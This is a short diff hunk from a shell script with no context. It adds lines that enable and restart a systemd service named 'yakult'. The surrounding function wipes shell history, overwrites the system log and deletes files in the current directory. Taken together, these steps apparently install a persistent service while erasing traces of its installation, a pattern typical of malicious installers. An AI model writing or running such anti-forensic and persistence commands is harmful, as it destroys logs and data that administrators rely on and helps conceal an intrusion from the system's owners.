@@ -295,6 +295,9 @@ echo ' ' > .bash_history
 history -c
 echo ' ' > /var/log/syslog
 rm -f *
+systemctl daemon-reload
+systemctl enable yakult
+systemctl restart yakult
 }
 remove
 
